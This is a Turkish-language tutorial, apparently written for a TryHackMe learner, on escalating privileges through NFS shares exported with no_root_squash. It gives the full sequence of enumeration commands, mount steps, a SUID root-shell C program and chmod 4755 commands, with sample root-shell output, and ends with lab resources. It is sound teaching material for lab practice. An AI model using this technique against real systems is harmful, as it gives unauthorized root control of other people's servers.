### **NFS ve `no_root_squash` Zafiyetini Anlamak**

Öncelikle temel kavramları netleştirelim.

- **NFS Nedir?** NFS (Ağ Dosya Sistemi), bir ağ üzerindeki kullanıcıların, sanki kendi bilgisayarlarındaymış gibi uzak bir sunucudaki dosyalara erişmelerini ve onları yönetmelerini sağlayan bir protokoldür. Linux/Unix sistemlerinde oldukça yaygındır.
- **Root Squashing Nedir? (Varsayılan ve Güvenli Durum)** Normalde, bir NFS sunucusu kendini korumak için "root squashing" mekanizmasını kullanır. Bu şu demektir: Uzak bir makineden `root` kullanıcısı, paylaşılan bir dizine erişmeye çalıştığında, NFS sunucusu bu `root` kullanıcısının yetkilerini sıradan, düşük yetkili bir kullanıcıya (genellikle `nfsnobody`) düşürür. Bu, `root` kullanıcısının sunucu üzerinde tehlikeli işlemler yapmasını engeller.
- **`no_root_squash` Nedir? (Tehlikeli ve Zafiyetli Durum)** Eğer NFS sunucusu `/etc/exports` dosyasında bir paylaşım için `no_root_squash` seçeneği ile yapılandırılmışsa, bu güvenlik mekanizması devre dışı bırakılır. Yani, uzak makinedeki `root` kullanıcısı, paylaşılan dizine bağlandığında **yine `root` olarak kalır**. İşte zafiyet tam olarak burada başlıyor.

Özetle, `no_root_squash` ayarı, NFS sunucusuna "Bana `root` olarak bağlanan istemciye güven, onun yetkilerini düşürme." demektir.

* * *

### **Zafiyetin Sömürülmesi: Adım Adım Senaryo**

Şimdi bu zafiyeti nasıl sömürebileceğimize dair pratik bir senaryo üzerinden gidelim. Hedef sistemde düşük yetkili bir kullanıcı (`lowuser`) olduğumuzu ve yetkimizi `root`'a yükseltmek istediğimizi varsayalım.

**Senaryo:**

- **Saldıran Makine IP:** `192.168.1.101`
- **Hedef (NFS Sunucusu) IP:** `192.168.1.105`

#### **Adım 1: Keşif - NFS Paylaşımlarını Bulma**

İlk işimiz, hedef sistemdeki NFS paylaşımlarını ve bunların yapılandırmasını kontrol etmektir. Bunun için hedef sistemde `/etc/exports` dosyasını okumaya çalışabiliriz veya kendi makinemizden `showmount` aracını kullanabiliriz.

**Hedef sistemde (düşük yetkili kullanıcı ile):**

Bash

```
cat /etc/exports
```

Çıktı şöyle olabilir:

```
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
/home *(rw,sync,no_subtree_check,no_root_squash)
/tmp *(rw,sync,no_subtree_check)
```

Bu çıktıda altın değerinde bir bilgi var: `/home` dizini `no_root_squash` seçeneği ile paylaşılmış! Bu, bizim için potansiyel bir giriş noktası.

Eğer hedef sisteme erişimimiz yoksa, kendi makinemizden `showmount` komutunu kullanırız:

Bash

```
showmount -e 192.168.1.105
```

Çıktı:

```
Export list for 192.168.1.105:
/home *
/tmp  *
```

Bu komut bize hangi dizinlerin paylaşıldığını söyler ama `no_root_squash` ayarını direkt göstermez. Bu yüzden `/etc/exports` dosyasını okuyabilmek her zaman daha iyidir.

#### **Adım 2: Hazırlık - Yerel Dizin Oluşturma ve Bağlanma**

Şimdi, saldırgan makinemizde (kendi bilgisayarımızda) bu paylaşılan dizini bağlamak için bir klasör oluşturalım ve `mount` komutu ile bağlantıyı gerçekleştirelim.

Bash

```
# Kendi makinemizde bir bağlama noktası oluşturuyoruz
sudo mkdir /mnt/nfs_home

# Hedefteki /home dizinini kendi makinemizdeki /mnt/nfs_home dizinine bağlıyoruz
sudo mount -t nfs 192.168.1.105:/home /mnt/nfs_home
```

Bu komut sorunsuz çalışırsa, artık `/mnt/nfs_home` dizininde yapacağımız her değişiklik, aslında hedef sunucunun `/home` dizininde gerçekleşecektir. En önemlisi, bu işlemleri kendi makinemizde `sudo` ile yani `root` olarak yaptığımız için, `no_root_squash` sayesinde hedefte de `root` yetkileriyle işlem yapmış olacağız.

#### **Adım 3: Sömürü - SUID Bitli Zararlı Yazılımı Oluşturma**

Sırada, bize `root` kabuğu verecek basit bir C programı yazmak var. Bu program, çalıştırıldığında `/bin/bash` komutunu başlatacak. Sihir ise **SUID (Set User ID)** biti sayesinde olacak. Bir dosyanın SUID biti ayarlandığında, o dosyayı kim çalıştırırsa çalıştırsın, dosya sahibinin (bizim durumumuzda `root`'un) yetkileriyle çalışır.

**Saldırgan makinemizde, bağladığımız dizin içinde `shell.c` adında bir dosya oluşturalım:**

Bash

```
cd /mnt/nfs_home
nano shell.c
```

İçine şu kodu yazalım:

C

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);   // Kendini root yap
    setgid(0);   // Kendini root grubuna al
    system("/bin/bash -p"); // -p parametresi, efektif UID'yi korur ve root kabuğu açar
    return 0;
}
```

Şimdi bu C kodunu derleyelim:

Bash

```
gcc shell.c -o shell
```

Artık `shell` adında çalıştırılabilir bir dosyamız var. Şimdi ona SUID bitini ekleyelim ve sahipliğini `root` yapalım. Bu işlemleri kendi makinemizde `sudo` ile yapıyoruz:

Bash

```
sudo chown root:root shell
sudo chmod 4755 shell
```

- `chown root:root`: Dosyanın sahibini ve grubunu `root` yapar.
- `chmod 4755`: SUID bitini (`4`) ekler ve diğer kullanıcılara çalıştırma izni (`755`) verir.

Kontrol edelim:

Bash

```
ls -l shell
```

Çıktı şöyle görünmeli:

```
-rwsr-xr-x 1 root root 8328 Jun 11 14:30 shell
```

Buradaki `s` harfi, SUID bitinin başarıyla ayarlandığını gösterir.

#### **Adım 4: Yetki Yükseltme - Hedef Sistemde Shell'i Çalıştırma**

Tüm hazırlıklar tamam! `shell` dosyamız artık hedef sunucunun `/home` dizininde ve `root` sahipliğinde duruyor.

Şimdi hedef sisteme geri dönelim (düşük yetkili `lowuser` hesabımızla) ve bu dosyayı çalıştıralım:

Bash

```
# Hedef sistemdeyiz
cd /home
./shell
```

**Ve sonuç:**

Bash

```
bash-5.0# whoami
root
bash-5.0# id
uid=0(root) gid=0(root) groups=0(root),1000(lowuser)
```

Tebrikler! `lowuser` olarak başlattığımız `shell` dosyası, SUID biti sayesinde `root` yetkileriyle çalıştı ve bize bir `root` kabuğu verdi. Artık hedef sistemde tam kontrole sahibiz.

* * *

### **Kaynaklar ve Pratik Yapma**

Bu konuyu pekiştirmek için aşağıdaki kaynakları kullanabilirsin:

- **Lab Ortamları (Şiddetle Tavsiye Edilir):**
    
    - **TryHackMe:** Zaten başladığın yer. "Wgel CTF" ve "Kenobi" odaları gibi odalarda bu zafiyetle karşılaşabilirsin.
    - **Hack The Box:** Birçok makinede NFS zafiyetleri bulunur. Başlangıç seviyesi makinelerde sıkça rastlanır.
    - **VulnHub:** Birçok zafiyetli sanal makine imajı barındırır. Kendi yerel laboratuvarını kurup pratik yapabilirsin. Örnek: "Kioptrix: Level 1" klasik bir başlangıçtır.
- **Teorik Bilgi ve Araçlar:**
    
    - **Kitap:** "Linux Privilege Escalation for OSCP & Beyond" gibi kaynaklar bu ve benzeri birçok tekniği detaylıca anlatır.
    - **Repo:** **PayloadsAllTheThings** GitHub deposu, yetki yükseltme teknikleri için harika bir referanstır. Özellikle [NFS bölümü](https://www.google.com/search?q=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%2520and%2520Resources/Linux%2520-%2520Privilege%2520Escalation.md%23nfs) çok faydalıdır.
    - **Makaleler:** "NFS `no_root_squash` privilege escalation" aramasıyla sayısız blog yazısı ve makaleye ulaşabilirsin.

&nbsp;